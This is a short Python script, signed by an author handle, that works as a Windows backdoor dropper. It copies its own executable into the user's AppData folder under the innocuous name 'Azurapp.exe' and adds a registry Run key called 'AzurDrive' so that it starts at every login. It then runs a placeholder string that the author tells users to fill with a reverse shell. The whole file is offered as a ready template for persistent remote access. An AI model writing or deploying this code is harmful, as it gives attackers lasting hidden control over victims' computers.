#Coded By Scrxll

import subprocess
import shutil
import sys
import os

location = os.environ["appdata"] + "\\Azurapp.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable,location)
    subprocess.call(' reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AzurDrive /t REG_SZ /d "' + location + '"', shell=True)

shellcode = '''paste your reverse shell inside this'''

subprocess.call(shellcode)
